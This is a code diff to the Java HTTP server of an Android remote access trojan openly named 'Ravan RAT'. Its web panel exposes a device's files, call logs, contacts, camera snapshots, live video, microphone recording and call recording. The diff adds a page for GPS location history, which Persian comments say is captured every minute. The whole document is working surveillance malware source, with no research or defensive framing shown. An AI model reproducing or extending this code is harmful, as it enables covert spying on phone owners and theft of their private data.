@@ -22,98 +22,98 @@ public class RavanHttpServer extends NanoHTTPD {
 
     private final Context context;
 
-    private static final String HTML_HEADER = "<!DOCTYPE html>" +
-            "<html lang=\"en\">" +
-            "<head>" +
-            "<meta charset=\"UTF-8\">" +
-            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
-            "<title>Ravan RAT</title>" +
-            "<style>" +
-            "* { margin: 0; padding: 0; box-sizing: border-box; }" +
-            "body {" +
-            "font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;" +
-            "background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);" +
-            "min-height: 100vh;" +
-            "color: #e8e8e8;" +
-            "}" +
-            ".container { max-width: 1200px; margin: 0 auto; padding: 20px; }" +
-            ".header { text-align: center; padding: 30px 0; border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 30px; }"
-            +
-            ".header h1 { font-size: 2.5rem; background: linear-gradient(90deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }"
-            +
-            ".header p { color: #888; }" +
-            ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 30px; }" +
-            ".nav a { padding: 12px 20px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.1); font-size: 0.9rem; }"
-            +
-            ".nav a:hover { background: rgba(233, 69, 96, 0.3); border-color: #e94560; transform: translateY(-2px); }" +
-            ".card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }"
-            +
-            ".file-list { list-style: none; }" +
-            ".file-item { display: flex; align-items: center; padding: 15px; margin: 8px 0; background: rgba(255,255,255,0.03); border-radius: 10px; transition: all 0.3s ease; border: 1px solid transparent; }"
-            +
-            ".file-item:hover { background: rgba(255,255,255,0.08); border-color: rgba(233, 69, 96, 0.3); }" +
-            ".file-icon { width: 45px; height: 45px; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 1.3rem; }"
-            +
-            ".folder-icon { background: linear-gradient(135deg, #f39c12, #f1c40f); }" +
-            ".file-icon-default { background: linear-gradient(135deg, #3498db, #2980b9); }" +
-            ".file-icon-image { background: linear-gradient(135deg, #9b59b6, #8e44ad); }" +
-            ".file-icon-video { background: linear-gradient(135deg, #e74c3c, #c0392b); }" +
-            ".file-icon-audio { background: linear-gradient(135deg, #1abc9c, #16a085); }" +
-            ".file-icon-doc { background: linear-gradient(135deg, #2ecc71, #27ae60); }" +
-            ".file-info { flex: 1; }" +
-            ".file-name { color: #fff; text-decoration: none; font-weight: 500; display: block; margin-bottom: 4px; }" +
-            ".file-name:hover { color: #e94560; }" +
-            ".file-meta { font-size: 0.85rem; color: #888; }" +
-            ".breadcrumb { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 10px; }"
-            +
-            ".breadcrumb a { color: #e94560; text-decoration: none; }" +
-            ".breadcrumb span { color: #666; }" +
-            "table { width: 100%; border-collapse: collapse; margin-top: 15px; }" +
-            "th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }" +
-            "th { background: rgba(233, 69, 96, 0.2); color: #e94560; font-weight: 600; font-size: 0.85rem; }" +
-            "td { font-size: 0.9rem; }" +
-            "tr:hover { background: rgba(255,255,255,0.03); }" +
-            ".call-incoming { color: #2ecc71; }" +
-            ".call-outgoing { color: #3498db; }" +
-            ".call-missed { color: #e74c3c; }" +
-            ".contact-avatar { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #e94560, #ff6b6b); display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px; }"
-            +
-            ".empty-state { text-align: center; padding: 60px 20px; color: #888; }" +
-            ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; }" +
-            ".info-section { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 20px; margin-bottom: 15px; }" +
-            ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }" +
-            ".info-item { display: flex; justify-content: space-between; padding: 10px 15px; background: rgba(255,255,255,0.03); border-radius: 8px; }"
-            +
-            ".info-label { color: #888; font-size: 0.85rem; }" +
-            ".info-value { color: #fff; font-weight: 500; font-size: 0.85rem; }" +
-            ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }" +
-            ".pagination a { padding: 8px 16px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; }"
-            +
-            ".pagination a:hover { background: rgba(233, 69, 96, 0.3); }" +
-            ".pagination .active { background: #e94560; }" +
-            "@media (max-width: 768px) { " +
-            ".header h1 { font-size: 1.8rem; } " +
-            ".nav a { padding: 10px 14px; font-size: 0.8rem; } " +
-            "th, td { padding: 8px 6px; font-size: 0.75rem; } " +
-            ".info-grid { grid-template-columns: 1fr; } " +
-            "}" +
-            "</style>" +
-            "</head>" +
-            "<body>" +
-            "<div class=\"container\">" +
-            "<div class=\"header\">" +
-            "<h1>Ravan RAT</h1>" +
-            "</div>" +
-            "<div class=\"nav\">" +
-            "<a href=\"/\">Home</a>" +
-            "<a href=\"/device\">Device Info</a>" +
-            "<a href=\"/camera\">Camera</a>" +
-            "<a href=\"/audio\">Audio</a>" +
-            "<a href=\"/files\">Files</a>" +
-            "<a href=\"/calls\">Call Logs</a>" +
-            "<a href=\"/contacts\">Contacts</a>" +
-            "</div>";
-
+private static final String HTML_HEADER = "<!DOCTYPE html>" +
+        "<html lang=\"en\">" +
+        "<head>" +
+        "<meta charset=\"UTF-8\">" +
+        "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
+        "<title>Ravan RAT</title>" +
+        "<style>" +
+        "* { margin: 0; padding: 0; box-sizing: border-box; }" +
+        "body {" +
+        "font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;" +
+        "background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);" +
+        "min-height: 100vh;" +
+        "color: #e8e8e8;" +
+        "}" +
+        ".container { max-width: 1200px; margin: 0 auto; padding: 20px; }" +
+        ".header { text-align: center; padding: 30px 0; border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 30px; }"
+        +
+        ".header h1 { font-size: 2.5rem; background: linear-gradient(90deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }"
+        +
+        ".header p { color: #888; }" +
+        ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 30px; }" +
+        ".nav a { padding: 12px 20px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.1); font-size: 0.9rem; }"
+        +
+        ".nav a:hover { background: rgba(233, 69, 96, 0.3); border-color: #e94560; transform: translateY(-2px); }" +
+        ".card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }"
+        +
+        ".file-list { list-style: none; }" +
+        ".file-item { display: flex; align-items: center; padding: 15px; margin: 8px 0; background: rgba(255,255,255,0.03); border-radius: 10px; transition: all 0.3s ease; border: 1px solid transparent; }"
+        +
+        ".file-item:hover { background: rgba(255,255,255,0.08); border-color: rgba(233, 69, 96, 0.3); }" +
+        ".file-icon { width: 45px; height: 45px; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 1.3rem; }"
+        +
+        ".folder-icon { background: linear-gradient(135deg, #f39c12, #f1c40f); }" +
+        ".file-icon-default { background: linear-gradient(135deg, #3498db, #2980b9); }" +
+        ".file-icon-image { background: linear-gradient(135deg, #9b59b6, #8e44ad); }" +
+        ".file-icon-video { background: linear-gradient(135deg, #e74c3c, #c0392b); }" +
+        ".file-icon-audio { background: linear-gradient(135deg, #1abc9c, #16a085); }" +
+        ".file-icon-doc { background: linear-gradient(135deg, #2ecc71, #27ae60); }" +
+        ".file-info { flex: 1; }" +
+        ".file-name { color: #fff; text-decoration: none; font-weight: 500; display: block; margin-bottom: 4px; }" +
+        ".file-name:hover { color: #e94560; }" +
+        ".file-meta { font-size: 0.85rem; color: #888; }" +
+        ".breadcrumb { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 10px; }"
+        +
+        ".breadcrumb a { color: #e94560; text-decoration: none; }" +
+        ".breadcrumb span { color: #666; }" +
+        "table { width: 100%; border-collapse: collapse; margin-top: 15px; }" +
+        "th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }" +
+        "th { background: rgba(233, 69, 96, 0.2); color: #e94560; font-weight: 600; font-size: 0.85rem; }" +
+        "td { font-size: 0.9rem; }" +
+        "tr:hover { background: rgba(255,255,255,0.03); }" +
+        ".call-incoming { color: #2ecc71; }" +
+        ".call-outgoing { color: #3498db; }" +
+        ".call-missed { color: #e74c3c; }" +
+        ".contact-avatar { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #e94560, #ff6b6b); display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px; }"
+        +
+        ".empty-state { text-align: center; padding: 60px 20px; color: #888; }" +
+        ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; }" +
+        ".info-section { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 20px; margin-bottom: 15px; }" +
+        ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }" +
+        ".info-item { display: flex; justify-content: space-between; padding: 10px 15px; background: rgba(255,255,255,0.03); border-radius: 8px; }"
+        +
+        ".info-label { color: #888; font-size: 0.85rem; }" +
+        ".info-value { color: #fff; font-weight: 500; font-size: 0.85rem; }" +
+        ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }" +
+        ".pagination a { padding: 8px 16px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; }"
+        +
+        ".pagination a:hover { background: rgba(233, 69, 96, 0.3); }" +
+        ".pagination .active { background: #e94560; }" +
+        "@media (max-width: 768px) { " +
+        ".header h1 { font-size: 1.8rem; } " +
+        ".nav a { padding: 10px 14px; font-size: 0.8rem; } " +
+        "th, td { padding: 8px 6px; font-size: 0.75rem; } " +
+        ".info-grid { grid-template-columns: 1fr; } " +
+        "}" +
+        "</style>" +
+        "</head>" +
+        "<body>" +
+        "<div class=\"container\">" +
+        "<div class=\"header\">" +
+        "<h1>Ravan RAT</h1>" +
+        "</div>" +
+        "<div class=\"nav\">" +
+        "<a href=\"/\">Home</a>" +
+        "<a href=\"/device\">Device Info</a>" +
+        "<a href=\"/camera\">Camera</a>" +
+        "<a href=\"/audio\">Audio</a>" +
+        "<a href=\"/files\">Files</a>" +
+        "<a href=\"/calls\">Call Logs</a>" +
+        "<a href=\"/contacts\">Contacts</a>" +
+        "<a href=\"/locations\">📍 Locations</a>" +
+        "</div>";
     private static final String HTML_FOOTER = "</div>" +
             "</body>" +
             "</html>";
@@ -123,137 +123,157 @@ public class RavanHttpServer extends NanoHTTPD {
         this.context = context;
     }
 
-    @Override
-    public Response serve(IHTTPSession session) {
-        String uri = session.getUri();
-        Map<String, String> params = session.getParms();
+@Override
+public Response serve(IHTTPSession session) {
+    String uri = session.getUri();
+    Map<String, String> params = session.getParms();
 
-        try {
-            if (uri.equals("/") || uri.isEmpty()) {
-                return serveHome();
-            } else if (uri.equals("/device")) {
-                return serveDeviceInfo();
-            } else if (uri.equals("/files") || uri.startsWith("/files/")) {
-                return serveFiles(uri, params);
-            } else if (uri.equals("/calls")) {
-                return serveCallLogs(params);
-            } else if (uri.equals("/contacts")) {
-                return serveContacts(params);
-            } else if (uri.equals("/camera")) {
-                return serveCameraPage();
-            } else if (uri.equals("/camera/capture")) {
-                return serveCameraCapture(params);
-            } else if (uri.equals("/camera/photo")) {
-                return serveCameraPhoto(params);
-            } else if (uri.equals("/camera/live")) {
-                return serveLiveStreamPage(params);
-            } else if (uri.equals("/camera/stream")) {
-                return serveMJPEGStream(params);
-            } else if (uri.equals("/camera/frame")) {
-                return serveSingleFrame();
-            } else if (uri.equals("/camera/start-stream")) {
-                return startCameraStream(params);
-            } else if (uri.equals("/camera/stop-stream")) {
-                return stopCameraStream();
-            } else if (uri.equals("/camera/record")) {
-                return startVideoRecording(params);
-            } else if (uri.equals("/camera/stop-record")) {
-                return stopVideoRecording();
-            } else if (uri.equals("/camera/status")) {
-                return serveCameraStatus();
-            } else if (uri.startsWith("/download/")) {
-                return serveDownload(uri);
-            } else if (uri.equals("/audio")) {
-                return serveAudioPage();
-            } else if (uri.equals("/audio/mic/start")) {
-                return startMicRecording(params);
-            } else if (uri.equals("/audio/mic/stop")) {
-                return stopMicRecording();
-            } else if (uri.equals("/audio/call/start")) {
-                return startCallRecording(params);
-            } else if (uri.equals("/audio/call/stop")) {
-                return stopCallRecording();
-            } else if (uri.equals("/audio/status")) {
-                return serveAudioStatus();
-            } else if (uri.equals("/audio/settings")) {
-                return updateAudioSettings(params);
-            } else if (uri.equals("/audio/recordings")) {
-                return serveAudioRecordings();
-            } else {
-                return serve404();
-            }
-        } catch (Exception e) {
-            return serveError(e.getMessage());
+    try {
+        if (uri.equals("/") || uri.isEmpty()) {
+            return serveHome();
+        } else if (uri.equals("/device")) {
+            return serveDeviceInfo();
+        } else if (uri.equals("/files") || uri.startsWith("/files/")) {
+            return serveFiles(uri, params);
+        } else if (uri.equals("/calls")) {
+            return serveCallLogs(params);
+        } else if (uri.equals("/contacts")) {
+            return serveContacts(params);
+        } else if (uri.equals("/locations")) {
+            return serveLocations();
+        } else if (uri.equals("/camera")) {
+            return serveCameraPage();
+        } else if (uri.equals("/camera/capture")) {
+            return serveCameraCapture(params);
+        } else if (uri.equals("/camera/photo")) {
+            return serveCameraPhoto(params);
+        } else if (uri.equals("/camera/live")) {
+            return serveLiveStreamPage(params);
+        } else if (uri.equals("/camera/stream")) {
+            return serveMJPEGStream(params);
+        } else if (uri.equals("/camera/frame")) {
+            return serveSingleFrame();
+        } else if (uri.equals("/camera/start-stream")) {
+            return startCameraStream(params);
+        } else if (uri.equals("/camera/stop-stream")) {
+            return stopCameraStream();
+        } else if (uri.equals("/camera/record")) {
+            return startVideoRecording(params);
+        } else if (uri.equals("/camera/stop-record")) {
+            return stopVideoRecording();
+        } else if (uri.equals("/camera/status")) {
+            return serveCameraStatus();
+        } else if (uri.startsWith("/download/")) {
+            return serveDownload(uri);
+        } else if (uri.equals("/audio")) {
+            return serveAudioPage();
+        } else if (uri.equals("/audio/mic/start")) {
+            return startMicRecording(params);
+        } else if (uri.equals("/audio/mic/stop")) {
+            return stopMicRecording();
+        } else if (uri.equals("/audio/call/start")) {
+            return startCallRecording(params);
+        } else if (uri.equals("/audio/call/stop")) {
+            return stopCallRecording();
+        } else if (uri.equals("/audio/status")) {
+            return serveAudioStatus();
+        } else if (uri.equals("/audio/settings")) {
+            return updateAudioSettings(params);
+        } else if (uri.equals("/audio/recordings")) {
+            return serveAudioRecordings();
+        } else {
+            return serve404();
         }
+    } catch (Exception e) {
+        return serveError(e.getMessage());
     }
+}
 
-    private Response serveHome() {
-        String ipv6 = MainActivity.getLocalIPv6Address();
-        String ipDisplay = (ipv6 != null ? ipv6 : "Not Available");
+private Response serveHome() {
+    String ipv6 = MainActivity.getLocalIPv6Address();
+    String ipDisplay = (ipv6 != null ? ipv6 : "Not Available");
 
-        String html = HTML_HEADER +
-                "<div class=\"card\">" +
-                "<h2 style=\"margin-bottom: 20px;\">Device Status</h2>" +
-                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">"
-                +
-                "<div style=\"padding: 20px; background: rgba(46, 204, 113, 0.1); border-radius: 10px; border-left: 4px solid #2ecc71;\">"
-                +
-                "<div style=\"font-size: 0.9rem; color: #888;\">Server Status</div>" +
-                "<div style=\"font-size: 1.3rem; font-weight: bold; color: #2ecc71;\">Online</div>" +
-                "</div>" +
-                "<div style=\"padding: 20px; background: rgba(52, 152, 219, 0.1); border-radius: 10px; border-left: 4px solid #3498db;\">"
-                +
-                "<div style=\"font-size: 0.9rem; color: #888;\">Port</div>" +
-                "<div style=\"font-size: 1.3rem; font-weight: bold; color: #3498db;\">8080</div>" +
-                "</div>" +
-                "<div style=\"padding: 20px; background: rgba(233, 69, 96, 0.1); border-radius: 10px; border-left: 4px solid #e94560;\">"
-                +
-                "<div style=\"font-size: 0.9rem; color: #888;\">IPv6 Address</div>" +
-                "<div style=\"font-size: 0.9rem; font-weight: bold; color: #e94560; word-break: break-all;\">"
-                + ipDisplay + "</div>" +
-                "</div>" +
-                "</div>" +
-                "</div>" +
-                "<div class=\"card\">" +
-                "<h2 style=\"margin-bottom: 20px;\">Quick Access</h2>" +
-                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">"
-                +
-                "<a href=\"/device\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(155, 89, 182, 0.2), rgba(142, 68, 173, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(155, 89, 182, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128241;</div>" +
-                "<div style=\"color: #9b59b6; font-weight: 600; font-size: 0.9rem;\">Device Info</div>" +
-                "</a>" +
-                "<a href=\"/files\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(52, 152, 219, 0.2), rgba(41, 128, 185, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(52, 152, 219, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128193;</div>" +
-                "<div style=\"color: #3498db; font-weight: 600; font-size: 0.9rem;\">File Manager</div>" +
-                "</a>" +
-                "<a href=\"/calls\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.2), rgba(39, 174, 96, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(46, 204, 113, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128222;</div>" +
-                "<div style=\"color: #2ecc71; font-weight: 600; font-size: 0.9rem;\">Call Logs</div>" +
-                "</a>" +
-                "<a href=\"/contacts\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(230, 126, 34, 0.2), rgba(211, 84, 0, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(230, 126, 34, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128101;</div>" +
-                "<div style=\"color: #e67e22; font-weight: 600; font-size: 0.9rem;\">Contacts</div>" +
-                "</a>" +
-                "<a href=\"/camera\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(231, 76, 60, 0.2), rgba(192, 57, 43, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(231, 76, 60, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128247;</div>" +
-                "<div style=\"color: #e74c3c; font-weight: 600; font-size: 0.9rem;\">Camera</div>" +
-                "</a>" +
-                "<a href=\"/audio\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(26, 188, 156, 0.2), rgba(22, 160, 133, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(26, 188, 156, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#127908;</div>" +
-                "<div style=\"color: #1abc9c; font-weight: 600; font-size: 0.9rem;\">Audio</div>" +
-                "</a>" +
-                "</div>" +
-                "</div>" +
-                HTML_FOOTER;
+    String html = HTML_HEADER +
+            "<div class=\"card\">" +
+            "<h2 style=\"margin-bottom: 20px;\">Device Status</h2>" +
+            "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">"
+            +
+            "<div style=\"padding: 20px; background: rgba(46, 204, 113, 0.1); border-radius: 10px; border-left: 4px solid #2ecc71;\">"
+            +
+            "<div style=\"font-size: 0.9rem; color: #888;\">Server Status</div>" +
+            "<div style=\"font-size: 1.3rem; font-weight: bold; color: #2ecc71;\">Online</div>" +
+            "</div>" +
+            "<div style=\"padding: 20px; background: rgba(52, 152, 219, 0.1); border-radius: 10px; border-left: 4px solid #3498db;\">"
+            +
+            "<div style=\"font-size: 0.9rem; color: #888;\">Port</div>" +
+            "<div style=\"font-size: 1.3rem; font-weight: bold; color: #3498db;\">8080</div>" +
+            "</div>" +
+            "<div style=\"padding: 20px; background: rgba(233, 69, 96, 0.1); border-radius: 10px; border-left: 4px solid #e94560;\">"
+            +
+            "<div style=\"font-size: 0.9rem; color: #888;\">IPv6 Address</div>" +
+            "<div style=\"font-size: 0.9rem; font-weight: bold; color: #e94560; word-break: break-all;\">"
+            + ipDisplay + "</div>" +
+            "</div>" +
+            "</div>" +
+            "</div>" +
+            "<div class=\"card\">" +
+            "<h2 style=\"margin-bottom: 20px;\">Quick Access</h2>" +
+            "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">"
+            +
+            "<a href=\"/device\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(155, 89, 182, 0.2), rgba(142, 68, 173, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(155, 89, 182, 0.3);\">"
+            +
+            "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128241;</div>" +
+            "<div style=\"color: #9b59b6; font-weight: 600; font-size: 0.9rem;\">Device Info</div>" +
+            "</a>" +
+            "<a href=\"/files\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(52, 152, 219, 0.2), rgba(41, 128, 185, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(52, 152, 219, 0.3);\">"
+            +
+            "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128193;</div>" +
+            "<div style=\"color: #3498db; font-weight: 600; font-size: 0.9rem;\">File Manager</div>" +
+            "</a>" +
+            "<a href=\"/calls\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.2), rgba(39, 174, 96, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(46, 204, 113, 0.3);\">"
+            +
+            "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128222;</div>" +
+            "<div style=\"color: #2ecc71; font-weight: 600; font-size: 0.9rem;\">Call Logs</div>" +
+            "</a>" +
+            "<a href=\"/contacts\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(230, 126, 34, 0.2), rgba(211, 84, 0, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(230, 126, 34, 0.3);\">"
+            +
+            "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128101;</div>" +
+            "<div style=\"color: #e67e22; font-weight: 600; font-size: 0.9rem;\">Contacts</div>" +
+            "</a>" +
+            "<a href=\"/camera\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(231, 76, 60, 0.2), rgba(192, 57, 43, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(231, 76, 60, 0.3);\">"
+            +
+            "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128247;</div>" +
+            "<div style=\"color: #e74c3c; font-weight: 600; font-size: 0.9rem;\">Camera</div>" +
+            "</a>" +
+            "<a href=\"/audio\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(26, 188, 156, 0.2), rgba(22, 160, 133, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(26, 188, 156, 0.3);\">"
+            +
+            "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#127908;</div>" +
+            "<div style=\"color: #1abc9c; font-weight: 600; font-size: 0.9rem;\">Audio</div>" +
+            "</a>" +
+            "</div>" +
+            "</div>" +
+            HTML_FOOTER;
 
-        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
-    }
+    return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+}
+
+// تابع جدید برای صفحه Locations
+private Response serveLocations() {
+    String locationsHtml = HttpServerService.getSavedLocationsAsHtml();
+    
+    String html = HTML_HEADER +
+            "<div class=\"card\">" +
+            "<h2 style=\"margin-bottom: 20px;\">📍 تاریخچه موقعیت‌ها</h2>" +
+            "<p style=\"color: #888; margin-bottom: 20px;\">موقعیت‌هایی که هر 1 دقیقه از GPS گرفته شده اند</p>" +
+            locationsHtml +
+            "<div style=\"margin-top: 20px; text-align: center;\">" +
+            "<a href=\"/\" style=\"color: #e94560; text-decoration: none;\">← بازگشت به صفحه اصلی</a>" +
+            "</div>" +
+            "</div>" +
+            HTML_FOOTER;
+    
+    return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+}
 
     private Response serveDeviceInfo() {
         String html = HTML_HEADER +
